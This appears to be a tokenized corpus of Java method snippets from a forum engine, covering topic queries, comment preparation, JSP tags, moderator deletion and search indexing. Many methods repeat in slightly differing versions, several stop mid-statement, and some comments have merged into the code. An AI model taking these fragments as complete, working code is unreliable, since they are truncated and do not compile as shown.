private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss , null , null ) ; } 
public PreparedComment prepareCommentForReplayto ( Comment comment , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , null , secure , false ) ; } 
private void loadTopicScroller ( Map < String , Object > params , Topic topic , User currentUser , boolean useIgnoreList ) { Topic prevMessage ; Topic nextMessage ; if ( useIgnoreList ) { prevMessage = messageDao . getPreviousMessage ( topic , currentUser ) ; nextMessage = messageDao . getNextMessage ( topic , currentUser ) ; } else { prevMessage = messageDao . getPreviousMessage ( topic , null ) ; nextMessage = messageDao . getNextMessage ( topic , null ) ; } params . put ( " prevMessage " , prevMessage ) ; params . put ( " nextMessage " , nextMessage ) ; Boolean topScroller ; SectionScrollModeEnum sectionScroller = sectionService . getScrollMode ( topic . getSectionId ( ) ) ; if ( prevMessage = = null & & nextMessage = = null ) { topScroller = false ; } else { topScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; } params . put ( " topScroller " , topScroller ) ; Boolean bottomScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; params . put ( " bottomScroller " , bottomScroller ) ; } 
public List < Comment > getCommentsSubtree ( int parentId ) throws MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return getCommentList ( parentList , false , 0 , 0 , ImmutableSet . < Integer > of ( ) ) ; } 
public static Set < Integer > makeHideSet ( UserDao userDao , CommentList comments , int filterChain , Set < Integer > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , Set < Integer > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public List < Comment > getCommentsSubtree ( int parentId ) throws MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return parentList ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . transform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( text , comment , comments , secure , false , tmpl , topic ) ) ; } return commentsPrepared ; } 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { List < Integer > deletedTopicIds ; List < Integer > deletedCommentIds ; userDao . blockWithoutTransaction ( user , moderator , reason ) ; deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment , boolean secure ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , null , secure , null , null ) ; } 
private PreparedRSSComment prepareRSSComment ( @Nonnull MessageText messageText , @Nonnull Comment comment , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = prepareCommentTextRSS ( messageText , secure ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForReplayto ( Comment comment , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , secure ) ; } 
public List < PreparedRSSComment > prepareCommentListRSS ( @Nonnull List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedRSSComment > commentsPrepared = new ArrayList < PreparedRSSComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment , secure ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . transform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( text , comment , comments , secure , tmpl , topic ) ) ; } return commentsPrepared ; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagService . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TopicListController . tagListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( " <p class= \" tags \" ><i class= \" icon-tag \" ></i>&nbsp; " ) . append ( buf ) . append ( " </p> " ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public String handle404 ( ) { return " errors/code404 " ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public void updateCurrentUser ( ) { initCurrentUser ( true ) ; } 
public static DateTimeFormatter iso8601 ( ) { return ISO8601 ; } 
public static DateTimeFormatter time ( ) { return TIME ; } 
public static DateTimeFormatter rfc822 ( ) { return RFC822 ; } 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( timeprop ! = null ) { data . put ( " timeprop " , timeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( timeprop ! = null ) { data . put ( " timeprop " , timeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public ApiUserRef ref ( User user ) { return new ApiUserRef ( user . getNick ( ) , 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( timeprop ! = null ) { data . put ( " timeprop " , timeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user , AuthUtil . getCurrentUser ( ) ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( timeprop ! = null ) { data . put ( " timeprop " , timeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public ApiUserRef ref ( User user , User requestUser ) { Integer score = null ; Integer maxScore = null ; if ( requestUser ! = null & & requestUser . isModerator ( ) ) { score = user . getScore ( ) ; maxScore = user . getMaxScore ( ) ; } return new ApiUserRef ( user . getNick ( ) , 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user , AuthUtil . getCurrentUser ( ) ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public String apply ( Date input ) { return DateFormats . getDefault ( ) . print ( input . getTime ( ) ) ; } 
public String iso ( Date input ) { return DateFormats . iso8601 ( ) . print ( input . getTime ( ) ) ; } 
public ApiUserRef ref ( User user , User requestUser ) { Integer score = null ; Integer maxScore = null ; if ( requestUser ! = null & & requestUser . isModerator ( ) & & ! user . isAnonymous ( ) ) { score = user . getScore ( ) ; maxScore = user . getMaxScore ( ) ; } return new ApiUserRef ( user . getNick ( ) , 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; UserService apiUserService = context . getBean ( UserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user , AuthUtil . getCurrentUser ( ) ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; try { out . append ( " <div class= \" userpic \" > " ) . append ( " <img class= \" photo \" src= \" " ) . append ( userpic . getUrl ( ) ) . append ( " \" alt= \" \" width= " + userpic . getWidth ( ) + " height= " + userpic . getHeight ( ) ) . append ( " > " ) . append ( " </div> " ) ; } catch ( IOException ex ) { throw new JspException ( ex ) ; } return SKIP_BODY ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } return mv ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = topicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ) ; List < TopicListDto . DeletedTopic > deleted = topicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , ProfileProperties profileProperties , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profileProperties , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profileProperties . getAvatarMode ( ) ) ; } return new TopicMenu ( topicEditable , 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public ApiUserRef ref ( User user , @Nullable User requestUser ) { Integer score = null ; Integer maxScore = null ; if ( requestUser ! = null & & requestUser . isModerator ( ) & & ! user . isAnonymous ( ) ) { score = user . getScore ( ) ; maxScore = user . getMaxScore ( ) ; } return new ApiUserRef ( user . getNick ( ) , 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . blockWithoutTransaction ( user , moderator , reason ) ; List < Integer > deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public void hideNode ( Set < Integer > hideSet ) { if ( comment ! = null ) { hideSet . add ( comment . getId ( ) ) ; } for ( CommentNode child : childs ) { child . hideNode ( hideSet ) ; 
public Comment getById ( int id ) throws MessageNotFoundException { Comment comment ; try { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Comment ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return comment ; } 
public Comment mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Comment ( resultSet ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { comments . add ( new Comment ( resultSet ) ) ; } 
public boolean deleteComment ( int msgid , String reason , User user , int scoreBonus ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { Integer bonus = resultSet . getInt ( " bonus " ) ; if ( resultSet . wasNull ( ) ) { bonus = null ; } return new DeleteInfo ( resultSet . getInt ( " userid " ) , 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private void updateMessage ( Topic topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " section " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userDao . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
private ApiDeleteInfo loadDeleteInfo ( Comment comment ) throws UserNotFoundException { ApiDeleteInfo deleteInfo = null ; if ( comment . isDeleted ( ) ) { DeleteInfo info = deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; deleteInfo = new ApiDeleteInfo ( userDao . getUserCached ( info . getUserid ( ) ) . getNick ( ) , info . getReason ( ) ) ; } return deleteInfo ; } 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " topic " , ImmutableMap . of ( " id " , topic . getId ( ) , " link " , topic . getLink ( ) ) ) ; data . put ( " showMenu " , showMenu ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) throws JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " topic " , new ApiCommentTopicInfo ( topic . getId ( ) , topic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public static String getNewsViewerLink ( int section ) throws SectionNotFoundException { String urlName = getUrlName ( section ) ; switch ( section ) { case SECTION_FORUM : 
public void checkView ( @Nonnull Topic message , @Nullable User currentUser ) throws MessageNotFoundException { if ( currentUser ! = null & & currentUser . isModerator ( ) ) { return ; } if ( message . isDeleted ( ) ) { if ( message . isExpired ( ) ) { 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) throws Exception { Topic topic = topicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { throw new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( topic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( topic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getCurrentProfile ( ) . getProperties ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , topic ) ; return ImmutableMap . < String , Object > of ( " comments " , preparedComments ) ; } 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) throws Exception { Topic topic = topicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { throw new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( topic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( topic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getCurrentProfile ( ) . getProperties ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , topic ) ; return ImmutableMap . < String , Object > of ( " comments " , preparedComments , 
